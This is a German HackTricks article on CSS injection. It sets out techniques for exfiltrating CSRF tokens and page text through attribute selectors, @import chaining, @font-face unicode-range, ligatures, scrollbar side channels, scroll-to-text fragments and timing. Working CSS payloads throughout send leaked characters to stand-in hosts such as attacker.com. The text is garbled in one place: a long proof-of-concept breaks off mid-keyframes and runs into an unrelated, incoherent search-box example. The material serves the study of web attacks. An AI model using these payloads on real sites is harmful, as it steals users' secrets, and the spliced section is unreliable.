# CSS-Injektion

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## CSS-Injektion

### Attribut-Selektor

CSS-Selektoren werden erstellt, um Werte der `name`- und `value`-Attribute eines `input`-Elements abzugleichen. Wenn der Wert des Eingabeelements mit einem bestimmten Zeichen beginnt, wird eine vordefinierte externe Ressource geladen:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Allerdings st√∂√üt dieser Ansatz an seine Grenzen, wenn es um versteckte Eingabeelemente (`type="hidden"`) geht, da versteckte Elemente keine Hintergr√ºnde laden.

#### Umgehung f√ºr versteckte Elemente

Um diese Einschr√§nkung zu umgehen, k√∂nnen Sie ein nachfolgendes Geschwisterelement mit dem `~`-Allgemein-Geschwister-Kombinator ansprechen. Die CSS-Regel wird dann auf alle Geschwister angewendet, die dem versteckten Eingabeelement folgen, wodurch das Hintergrundbild geladen wird:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Ein praktisches Beispiel zur Ausnutzung dieser Technik wird im bereitgestellten Code-Snippet detailliert beschrieben. Sie k√∂nnen es [hier](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e) einsehen.

#### Voraussetzungen f√ºr CSS-Injection

Damit die CSS-Injection-Technik effektiv ist, m√ºssen bestimmte Bedingungen erf√ºllt sein:

1. **Payload-L√§nge**: Der CSS-Injection-Vektor muss ausreichend lange Payloads unterst√ºtzen, um die erstellten Selektoren aufzunehmen.
2. **CSS-Neubewertung**: Sie sollten die M√∂glichkeit haben, die Seite zu rahmen, was erforderlich ist, um die Neubewertung von CSS mit neu generierten Payloads auszul√∂sen.
3. **Externe Ressourcen**: Die Technik setzt die M√∂glichkeit voraus, extern gehostete Bilder zu verwenden. Dies kann durch die Content Security Policy (CSP) der Website eingeschr√§nkt sein.

### Blind-Attributselektor

Wie [**in diesem Beitrag erkl√§rt**](https://portswigger.net/research/blind-css-exfiltration), ist es m√∂glich, die Selektoren **`:has`** und **`:not`** zu kombinieren, um Inhalte auch von blinden Elementen zu identifizieren. Dies ist sehr n√ºtzlich, wenn Sie keine Ahnung haben, was sich in der Webseite befindet, die die CSS-Injection l√§dt.\
Es ist auch m√∂glich, diese Selektoren zu verwenden, um Informationen aus mehreren Bl√∂cken desselben Typs zu extrahieren, wie zum Beispiel:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Kombiniert man dies mit der folgenden **@import**-Technik, ist es m√∂glich, eine Menge **Informationen mithilfe von CSS-Injection von blinden Seiten mit** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)** zu exfiltrieren**.

### @import

Die vorherige Technik hat einige Nachteile, √ºberpr√ºfen Sie die Voraussetzungen. Sie m√ºssen entweder in der Lage sein, **mehrere Links an das Opfer zu senden**, oder Sie m√ºssen in der Lage sein, **die CSS-Injection-anf√§llige Seite in ein iFrame einzubetten**.

Es gibt jedoch eine weitere clevere Technik, die **CSS `@import`** verwendet, um die Qualit√§t der Technik zu verbessern.

Dies wurde erstmals von [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) gezeigt und funktioniert wie folgt:

Anstatt die gleiche Seite immer wieder mit dutzenden unterschiedlichen Payloads zu laden (wie in der vorherigen Technik), werden wir **die Seite nur einmal laden und nur mit einem Import zum Server des Angreifers** (dies ist der Payload, der an das Opfer gesendet werden soll):
```css
@import url('//attacker.com:5001/start?');
```
1. Der Import **erh√§lt ein CSS-Skript** von den Angreifern und der **Browser l√§dt es**.
2. Der erste Teil des CSS-Skripts, das der Angreifer sendet, ist **ein weiteres `@import` zum Server der Angreifer**.
3. Der Server der Angreifer antwortet vorerst nicht auf diese Anfrage, da wir einige Zeichen durchsickern lassen m√∂chten und dann auf diesen Import antworten, um die n√§chsten Zeichen durchsickern zu lassen.
4. Der zweite und gr√∂√üere Teil des Payloads wird ein **Leckage-Payload f√ºr Attributselektoren** sein.
5. Dadurch wird der Server der Angreifer das **erste Zeichen des Geheimnisses und das letzte Zeichen** erhalten.
6. Sobald der Server der Angreifer das **erste und letzte Zeichen des Geheimnisses** erhalten hat, wird er den in Schritt 2 angeforderten Import **beantworten**.
7. Die Antwort wird genau die gleichen Schritte 2, 3 und 4 sein, aber diesmal wird versucht, das **zweite Zeichen des Geheimnisses und dann das vorletzte** zu finden.

Der Angreifer wird diese Schleife **verfolgen, bis er das Geheimnis vollst√§ndig durchgesickert hat**.

Den urspr√ºnglichen [**Code von Pepe Vila, um dies auszunutzen, finden Sie hier**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) oder Sie finden fast den [**gleichen Code, aber kommentiert hier**](./#css-injection).

{% hint style="info" %}
Das Skript versucht jedes Mal, 2 Zeichen zu entdecken (vom Anfang und vom Ende), weil der Attributselektor es erm√∂glicht, Dinge wie:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Dies erm√∂glicht es dem Skript, das Geheimnis schneller zu enth√ºllen.
{% endhint %}

{% hint style="warning" %}
Manchmal erkennt das Skript **nicht korrekt, dass das entdeckte Pr√§fix + Suffix bereits die vollst√§ndige Flagge ist**, und es wird weiter vorw√§rts (im Pr√§fix) und r√ºckw√§rts (im Suffix) gehen und irgendwann h√§ngen bleiben.\
Keine Sorge, √ºberpr√ºfen Sie einfach die **Ausgabe**, denn **dort k√∂nnen Sie die Flagge sehen**.
{% endhint %}

### Andere Selektoren

Andere M√∂glichkeiten, auf DOM-Teile mit **CSS-Selektoren** zuzugreifen:

* **`.class-to-search:nth-child(2)`**: Dies sucht das zweite Element mit der Klasse "class-to-search" im DOM.
*   **`:empty`** Selektor: Wird zum Beispiel in [**diesem Writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)** verwendet:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### Fehlerbasierter XS-Search

**Referenz:** [CSS-basierter Angriff: Missbrauch von unicode-range von @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC von @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Die allgemeine Absicht besteht darin, **eine benutzerdefinierte Schriftart von einem kontrollierten Endpunkt zu verwenden** und sicherzustellen, dass **Text (in diesem Fall 'A') nur dann mit dieser Schriftart angezeigt wird, wenn die angegebene Ressource (`favicon.ico`) nicht geladen werden kann**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Verwendung einer benutzerdefinierten Schriftart**:
- Eine benutzerdefinierte Schriftart wird mit der `@font-face`-Regel innerhalb eines `<style>`-Tags im `<head>`-Abschnitt definiert.
- Die Schriftart wird als `poc` bezeichnet und von einem externen Endpunkt (`http://attacker.com/?leak`) abgerufen.
- Die Eigenschaft `unicode-range` ist auf `U+0041` festgelegt und zielt auf das spezifische Unicode-Zeichen 'A' ab.

2. **Objektelement mit Fallback-Text**:
- Ein `<object>`-Element mit der `id="poc0"` wird im `<body>`-Abschnitt erstellt. Dieses Element versucht, eine Ressource von `http://192.168.0.1/favicon.ico` zu laden.
- Die `font-family` f√ºr dieses Element ist auf `'poc'` festgelegt, wie im `<style>`-Abschnitt definiert.
- Wenn die Ressource (`favicon.ico`) nicht geladen werden kann, wird der Fallback-Inhalt (der Buchstabe 'A') innerhalb des `<object>`-Tags angezeigt.
- Der Fallback-Inhalt ('A') wird mit der benutzerdefinierten Schriftart `poc` gerendert, wenn die externe Ressource nicht geladen werden kann.

### Styling des Scroll-to-Text-Fragments

Die **`:target`**-Pseudoklasse wird verwendet, um ein Element auszuw√§hlen, das von einem **URL-Fragment** anvisiert wird, wie in der [CSS Selectors Level 4-Spezifikation](https://drafts.csswg.org/selectors-4/#the-target-pseudo) angegeben. Es ist wichtig zu verstehen, dass `::target-text` keine Elemente ausw√§hlt, es sei denn, der Text wird explizit durch das Fragment anvisiert.

Ein Sicherheitsproblem entsteht, wenn Angreifer die Funktion des **Scroll-to-Text-Fragments** ausnutzen, um die Anwesenheit eines bestimmten Textes auf einer Webseite zu best√§tigen, indem sie eine Ressource √ºber HTML-Injection von ihrem Server laden. Die Methode besteht darin, eine CSS-Regel wie diese einzuf√ºgen:
```css
:target::before { content : url(target.png) }
```
In solchen Szenarien wird, wenn der Text "Administrator" auf der Seite vorhanden ist, die Ressource `target.png` vom Server angefordert, was auf das Vorhandensein des Textes hinweist. Eine Instanz dieses Angriffs kann √ºber eine speziell erstellte URL ausgef√ºhrt werden, die das injizierte CSS zusammen mit einem Scroll-to-Text-Fragment einbettet:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Hier manipuliert der Angriff HTML-Injection, um den CSS-Code zu √ºbertragen und zielt dabei auf den spezifischen Text "Administrator" durch das Scroll-to-Text-Fragment (`#:~:text=Administrator`). Wenn der Text gefunden wird, wird die angegebene Ressource geladen und signalisiert unwissentlich ihre Anwesenheit dem Angreifer.

Zur Abwehr sollten folgende Punkte beachtet werden:

1. **Eingeschr√§nkte STTF-√úbereinstimmung**: Das Scroll-to-Text-Fragment (STTF) ist so konzipiert, dass es nur W√∂rter oder S√§tze abgleicht und somit seine F√§higkeit einschr√§nkt, beliebige Geheimnisse oder Tokens preiszugeben.
2. **Beschr√§nkung auf Top-Level-Browsing-Kontexte**: STTF funktioniert nur in Top-Level-Browsing-Kontexten und nicht in iframes, was jeden Exploit-Versuch f√ºr den Benutzer auff√§lliger macht.
3. **Notwendigkeit der Benutzeraktivierung**: STTF erfordert eine Benutzeraktivierungsgeste, um zu funktionieren, was bedeutet, dass Exploits nur durch benutzerinitiierte Navigationen m√∂glich sind. Diese Anforderung mindert erheblich das Risiko automatisierter Angriffe ohne Benutzerinteraktion. Dennoch weist der Autor des Blog-Beitrags auf spezifische Bedingungen und Umgehungen hin (z. B. Social Engineering, Interaktion mit g√§ngigen Browser-Erweiterungen), die die Automatisierung des Angriffs erleichtern k√∂nnten.

Das Bewusstsein f√ºr diese Mechanismen und potenzielle Schwachstellen ist entscheidend, um die Web-Sicherheit aufrechtzuerhalten und sich gegen solche ausbeuterischen Taktiken zu sch√ºtzen.

Weitere Informationen finden Sie im Originalbericht: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Sie k√∂nnen einen [**Exploit, der diese Technik f√ºr ein CTF verwendet, hier √ºberpr√ºfen**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Sie k√∂nnen **externe Schriftarten f√ºr bestimmte Unicode-Werte** angeben, die nur dann gesammelt werden, wenn diese Unicode-Werte auf der Seite vorhanden sind. Zum Beispiel:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Wenn Sie auf diese Seite zugreifen, holen Chrome und Firefox "?A" und "?B" ab, weil der Textknoten der sensiblen Informationen die Zeichen "A" und "B" enth√§lt. Chrome und Firefox holen jedoch "?C" nicht ab, da es "C" nicht enth√§lt. Das bedeutet, dass wir in der Lage waren, "A" und "B" zu lesen.

### Textknoten-Exfiltration (I): Ligaturen <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Referenz:** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

Die beschriebene Technik besteht darin, Text aus einem Knoten zu extrahieren, indem Schriftart-Ligaturen ausgenutzt und √Ñnderungen in der Breite √ºberwacht werden. Der Prozess umfasst mehrere Schritte:

1. **Erstellung von benutzerdefinierten Schriftarten**:
- SVG-Schriftarten werden mit Glyphen erstellt, die ein `horiz-adv-x`-Attribut haben, das eine gro√üe Breite f√ºr eine Glyphen darstellt, die eine Zwei-Zeichen-Sequenz repr√§sentiert.
- Beispiel-SVG-Glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, wobei "XY" eine Zwei-Zeichen-Sequenz darstellt.
- Diese Schriftarten werden dann mit Hilfe von FontForge in das woff-Format konvertiert.

2. **Erkennung von Breiten√§nderungen**:
- CSS wird verwendet, um sicherzustellen, dass der Text nicht umbrochen wird (`white-space: nowrap`) und um den Scrollbalkenstil anzupassen.
- Das Erscheinen eines horizontalen Scrollbalkens, der deutlich gestaltet ist, dient als Indikator (Orakel), dass eine bestimmte Ligatur und damit eine bestimmte Zeichenfolge im Text vorhanden ist.
- Das beteiligte CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Ausnutzungsprozess**:
- **Schritt 1**: Schriftarten werden f√ºr Zeichenpaare mit erheblicher Breite erstellt.
- **Schritt 2**: Ein Trick mit dem Scrollbalken wird verwendet, um zu erkennen, wann die Glyphen mit gro√üer Breite (Ligatur f√ºr ein Zeichenpaar) dargestellt werden, was auf das Vorhandensein der Zeichenfolge hinweist.
- **Schritt 3**: Bei Erkennung einer Ligatur werden neue Glyphen generiert, die Dreizeichenfolgen darstellen und das erkannte Paar enthalten und ein vorangehendes oder nachfolgendes Zeichen hinzuf√ºgen.
- **Schritt 4**: Die Erkennung der Dreizeichen-Ligatur wird durchgef√ºhrt.
- **Schritt 5**: Der Prozess wiederholt sich und enth√ºllt schrittweise den gesamten Text.

4. **Optimierung**:
- Die aktuelle Initialisierungsmethode mit `<meta refresh=...` ist nicht optimal.
- Ein effizienterer Ansatz k√∂nnte den CSS-`@import`-Trick verwenden, um die Leistung des Exploits zu verbessern.

### Textknoten-Exfiltration (II): Offenlegung des Zeichensatzes mit einer Standardschriftart (keine externen Ressourcen erforderlich) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** [PoC mit Comic Sans von @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Dieser Trick wurde in diesem [**Slackers-Thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/) ver√∂ffentlicht. Der im Textknoten verwendete Zeichensatz kann **unter Verwendung der Standard-Schriftarten** im Browser durchgesickert werden: Es sind keine externen - oder benutzerdefinierten - Schriftarten erforderlich.

Das Konzept besteht darin, eine Animation zu nutzen, um die Breite eines `div` schrittweise zu vergr√∂√üern, sodass ein Zeichen nach dem anderen vom "Suffix"-Teil des Textes zum "Pr√§fix"-Teil √ºbergeht. Dieser Prozess teilt den Text effektiv in zwei Abschnitte auf:

1. **Pr√§fix**: Die anf√§ngliche Zeile.
2. **Suffix**: Die nachfolgende(n) Zeile(n).

Die √úbergangsstufen der Zeichen w√ºrden wie folgt aussehen:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


W√§hrend dieses √úbergangs wird der **unicode-range-Trick** verwendet, um jedes neue Zeichen zu identifizieren, wenn es dem Pr√§fix beitritt. Dies wird erreicht, indem die Schriftart auf Comic Sans umgestellt wird, die deutlich gr√∂√üer als die Standardschriftart ist und somit einen vertikalen Scrollbalken ausl√∂st. Das Erscheinen dieses Scrollbalkens gibt indirekt das Vorhandensein eines neuen Zeichens im Pr√§fix preis.

Obwohl diese Methode die Erkennung eindeutiger Zeichen erm√∂glicht, wenn sie auftauchen, gibt sie nicht an, welches Zeichen wiederholt wird, sondern nur, dass eine Wiederholung stattgefunden hat.

{% hint style="info" %}
Im Wesentlichen wird der **unicode-range verwendet, um ein Zeichen zu erkennen**, aber da wir keine externe Schriftart laden m√∂chten, m√ºssen wir einen anderen Weg finden.\
Wenn das **Zeichen gefunden** wird, wird ihm die vorinstallierte **Comic Sans-Schriftart** zugewiesen, die das Zeichen **gr√∂√üer** macht und einen **Scrollbalken ausl√∂st**, der das gefundene Zeichen **preisgibt**.
{% endhint %}

√úberpr√ºfen Sie den aus dem PoC extrahierten Code:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
# CSS-Injection

CSS-Injection ist eine Technik, bei der b√∂sartiger CSS-Code in eine Webseite eingef√ºgt wird, um bestimmte Effekte zu erzielen oder Schwachstellen auszunutzen. Eine m√∂gliche Angriffsvektor ist die Injektion von CSS-Code √ºber eine Suchfunktion.

## Angriffsszenario

Ein Angreifer kann eine b√∂sartige Eingabe in das Suchfeld einer Webseite eingeben, um CSS-Code in die Suchergebnisse einzuf√ºgen. Wenn die Webseite den eingegebenen CSS-Code nicht ausreichend validiert oder filtert, wird der Code ausgef√ºhrt und kann verschiedene Auswirkungen haben.

## Beispiel

Angenommen, die Webseite enth√§lt folgenden CSS-Code:

```css
@keyframes example {
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```

Der Angreifer k√∂nnte den folgenden b√∂sartigen CSS-Code in das Suchfeld eingeben:

```css
@keyframes example {
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: red;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: red var(--leak);
}
```

Durch die Injektion dieses Codes in die Suchergebnisse kann der Angreifer die Hintergrundfarbe der Scrollleiste √§ndern und m√∂glicherweise sensible Informationen durch die Verwendung der Variable `--leak` preisgeben.
### Textknoten-Exfiltration (III): Auslaufen des Zeichensatzes mit einer Standardschriftart durch Verstecken von Elementen (keine externen Ressourcen erforderlich) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** Dies wird als [eine erfolglose L√∂sung in diesem Writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) erw√§hnt.

Dieser Fall ist dem vorherigen sehr √§hnlich, jedoch besteht in diesem Fall das Ziel darin, bestimmte Zeichen gr√∂√üer als andere zu machen, um etwas zu verstecken, wie z.B. einen Button, der nicht vom Bot gedr√ºckt werden soll, oder ein Bild, das nicht geladen wird. So k√∂nnten wir die Aktion (oder das Fehlen der Aktion) messen und wissen, ob ein bestimmtes Zeichen im Text vorhanden ist.

### Textknoten-Exfiltration (III): Auslaufen des Zeichensatzes durch Cache-Timing (keine externen Ressourcen erforderlich) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** Dies wird als [eine erfolglose L√∂sung in diesem Writeup](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) erw√§hnt.

In diesem Fall k√∂nnten wir versuchen, zu ermitteln, ob ein Zeichen im Text vorhanden ist, indem wir eine gef√§lschte Schriftart aus derselben Quelle laden:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Wenn es eine √úbereinstimmung gibt, wird die Schriftart von `/static/bootstrap.min.css?q=1` geladen. Obwohl dies nicht erfolgreich geladen wird, sollte der Browser es im Cache speichern, und selbst wenn kein Cache vorhanden ist, gibt es einen Mechanismus f√ºr "304 not modified", sodass die Antwort schneller sein sollte als andere Dinge.

Wenn jedoch der Zeitunterschied zwischen der gecachten Antwort und der nicht gecachten Antwort nicht gro√ü genug ist, ist dies nicht n√ºtzlich. Zum Beispiel erw√§hnte der Autor: Nach Tests stellte ich fest, dass das erste Problem darin besteht, dass die Geschwindigkeit nicht viel anders ist, und das zweite Problem besteht darin, dass der Bot das Flag `disk-cache-size=1` verwendet, was wirklich durchdacht ist.

### Textknoten-Exfiltration (III): Offenlegung des Zeichensatzes durch zeitgesteuertes Laden von Hunderten lokaler "Schriftarten" (keine externen Ressourcen erforderlich) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referenz:** Dies wird als [eine erfolglose L√∂sung in diesem Bericht](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves) erw√§hnt.

In diesem Fall k√∂nnen Sie CSS angeben, um Hunderte von gef√§lschten Schriftarten aus der gleichen Quelle zu laden, wenn eine √úbereinstimmung auftritt. Auf diese Weise k√∂nnen Sie die Zeit messen und feststellen, ob ein Zeichen angezeigt wird oder nicht, beispielsweise mit:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Und der Code des Bots sieht so aus:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Wenn die Schriftart nicht √ºbereinstimmt, wird erwartet, dass die Antwortzeit beim Besuch des Bots etwa 30 Sekunden betr√§gt. Wenn jedoch eine Schriftart√ºbereinstimmung vorliegt, werden mehrere Anfragen gesendet, um die Schriftart abzurufen, was dazu f√ºhrt, dass das Netzwerk kontinuierlich aktiv ist. Dadurch dauert es l√§nger, die Abbruchbedingung zu erf√ºllen und die Antwort zu erhalten. Daher kann die Antwortzeit als Indikator verwendet werden, um festzustellen, ob eine Schriftart√ºbereinstimmung vorliegt.

## Referenzen

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
